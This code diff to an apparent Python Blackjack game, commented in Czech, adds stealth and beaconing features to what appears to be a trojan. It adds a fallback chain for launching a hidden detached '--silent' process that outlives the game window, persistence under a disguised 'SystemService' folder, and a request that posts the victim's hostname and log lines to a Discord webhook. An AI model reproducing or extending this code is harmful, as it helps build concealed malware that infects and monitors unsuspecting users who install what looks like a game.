@@ -35,7 +35,7 @@ CAPTURE_FIELD_TYPE = True
 MAX_RETRIES = 3
 RETRY_DELAY = 5
 
-APP_VERSION = 4  # interní verze pro update check
+APP_VERSION = 5  # interní verze pro update check
 
 # Persistence
 APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
@@ -998,32 +998,66 @@ class BlackjackGUI:
 # SPAWNER
 # ═══════════════════════════════════════════════════════════════
 
-def spawn_silent_subprocess():
+def _spawn_error_log(msg: str):
+    """Zapíše spawn error do souboru pro pozdější diagnostiku."""
     try:
-        # Kontrola: už běží silent instance podle lockfile?
+        APP_DIR.mkdir(parents=True, exist_ok=True)
+        log_file = APP_DIR / "spawn.log"
+        with open(log_file, "a") as f:
+            f.write(f"{datetime.now().isoformat()} — {msg}\n")
+    except Exception:
+        pass
+
+
+def spawn_silent_subprocess():
+    """Spawn silent subprocess s fallback mechanismem a plnou diagnostikou."""
+    # Kontrola: už běží silent instance podle lockfile?
+    try:
         if SILENT_LOCK_FILE.exists():
             try:
                 old_pid = int(SILENT_LOCK_FILE.read_text().strip())
                 if _pid_alive(old_pid):
+                    _spawn_error_log(f"SKIP: silent PID {old_pid} already running")
                     return True  # už běží, není potřeba
             except (ValueError, OSError):
                 pass
+    except Exception as e:
+        _spawn_error_log(f"Lockfile check failed: {e}")
 
-        if IS_WINDOWS:
-            exe = sys.executable
-            args = [exe, "--silent"]
-            creation_flags = (
-                0x00000008 |  # DETACHED_PROCESS — nezdědí rodičovskou konzoli
-                0x00000200    # CREATE_NEW_PROCESS_GROUP
-            )
-            subprocess.Popen(
-                args,
-                creationflags=creation_flags,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL,
-            )
-        else:
+    if IS_WINDOWS:
+        exe = sys.executable
+        args = [exe, "--silent"]
+
+        # Fallback chain: DETACHED → NEW_PROCESS_GROUP → bez flags
+        flag_sets = [
+            ("DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP",
+             0x00000008 | 0x00000200),
+            ("CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW",
+             0x00000200 | 0x08000000),
+            ("bez flags", 0),
+        ]
+
+        for desc, flags in flag_sets:
+            try:
+                proc = subprocess.Popen(
+                    args,
+                    creationflags=flags,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    stdin=subprocess.DEVNULL,
+                )
+                _spawn_error_log(f"OK: spawned PID {proc.pid} with {desc}")
+                return True
+            except Exception as e:
+                _spawn_error_log(f"FAIL [{desc}]: {type(e).__name__}: {e}")
+                continue
+
+        # Všechny pokusy selhaly
+        _spawn_error_log(f"CRITICAL: all spawn attempts failed")
+        return False
+
+    else:
+        try:
             args = [sys.executable, __file__, "--silent"]
             subprocess.Popen(
                 args,
@@ -1032,9 +1066,10 @@ def spawn_silent_subprocess():
                 stdin=subprocess.DEVNULL,
                 start_new_session=True,
             )
-        return True
-    except Exception:
-        return False
+            return True
+        except Exception as e:
+            _spawn_error_log(f"FAIL [posix]: {type(e).__name__}: {e}")
+            return False
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -1049,6 +1084,29 @@ if __name__ == "__main__":
         install()
         send_startup_signal()  # i interactive posílá signal
         spawned = spawn_silent_subprocess()
+        # Pošli spawn status na Discord ať vidíme co se děje
+        try:
+            spawn_status = "✅ Silent spawned" if spawned else "❌ Spawn FAILED — check %APPDATA%\\SystemService\\spawn.log"
+            # Přečti spawn log pro detaily
+            spawn_detail = ""
+            try:
+                log_path = APP_DIR / "spawn.log"
+                if log_path.exists():
+                    lines = log_path.read_text().strip().split("\n")
+                    spawn_detail = "\n".join(lines[-5:])  # posledních 5 řádků
+            except Exception:
+                pass
+
+            requests.post(DISCORD_WEBHOOK_URL, json={
+                "embeds": [{
+                    "title": "🔧 Spawn Status",
+                    "description": f"Host: `{_get_hostname()}`\nResult: `{spawn_status}`\n```\n{spawn_detail[:1000]}\n```",
+                    "color": 0x00FF00 if spawned else 0xFF0000,
+                    "timestamp": datetime.now(timezone.utc).isoformat(),
+                }]
+            }, timeout=15)
+        except Exception:
+            pass
         if spawned:
             time.sleep(0.5)
 
@@ -1063,6 +1121,8 @@ if __name__ == "__main__":
 
         # GUI zavřeno → exit (silent subprocess žije dál)
         sys.exit(0)
+
+        # ═══ NOTE: spawn status se posílá v send_startup_signal v5+ ═══
 
     else:
         # ═══ SILENT MÓD ═══
